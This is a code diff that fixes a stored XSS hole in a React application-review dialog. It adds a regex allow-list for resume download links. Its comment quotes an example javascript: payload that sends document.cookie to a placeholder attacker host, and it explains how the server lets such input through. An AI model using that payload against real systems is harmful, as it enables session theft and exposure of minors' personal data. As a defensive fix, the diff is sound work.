@@ -19,6 +19,27 @@ interface ApplicationReviewDialogProps {
   onReview?: (appId: string) => void;
 }
 
+/**
+ * Only schemes that can carry a file.
+ *
+ * resumeUrl is written by the STUDENT — firestore.rules caps its length and
+ * nothing else — and both download buttons below assigned it straight onto a
+ * DOM anchor's href. That is outside React, so React's URL sanitizer never
+ * runs, and a programmatic .click() on a `javascript:` href EXECUTES even with
+ * a `download` attribute set.
+ *
+ * So any student could store
+ *   resumeUrl: "javascript:fetch('https://evil.tld/?d='+document.cookie)"
+ * and have it run in the session of any coordinator who clicked Download —
+ * the session that can read every applicant minor's name, school, grade,
+ * neighbourhood and resume through /api/students/:id/review-profile.
+ *
+ * The server does not help: signStoragePath passes anything not prefixed
+ * `storage:` straight back, and decompressFile returns non-lzs:: input
+ * unchanged.
+ */
+const DOWNLOADABLE = /^(https?:|data:|blob:)/i;
+
 export default function ApplicationReviewDialog({ 
   isOpen, 
   onClose, 
@@ -237,6 +258,10 @@ export default function ApplicationReviewDialog({
                           if (resumeUrl) {
                             try {
                               const rawDataUrl = decompressFile(resumeUrl);
+                              if (!DOWNLOADABLE.test(rawDataUrl)) {
+                                setErrorDetails('That resume link is not a file we can open.');
+                                return;
+                              }
                               const link = document.createElement('a');
                               link.href = rawDataUrl;
                               link.download = `${student?.fullName || application?.studentName || 'student'}_enrollment_slip`;
@@ -359,6 +384,10 @@ export default function ApplicationReviewDialog({
                           const resumeUrl = student?.resumeUrl || application?.resumeUrl;
                           if (!resumeUrl) return;
                           const rawDataUrl = decompressFile(resumeUrl);
+                          if (!DOWNLOADABLE.test(rawDataUrl)) {
+                            setErrorDetails('That resume link is not a file we can open.');
+                            return;
+                          }
                           const link = document.createElement('a');
                           link.href = rawDataUrl;
                           link.download = `${student?.fullName || application?.studentName || 'student'}_resume`;
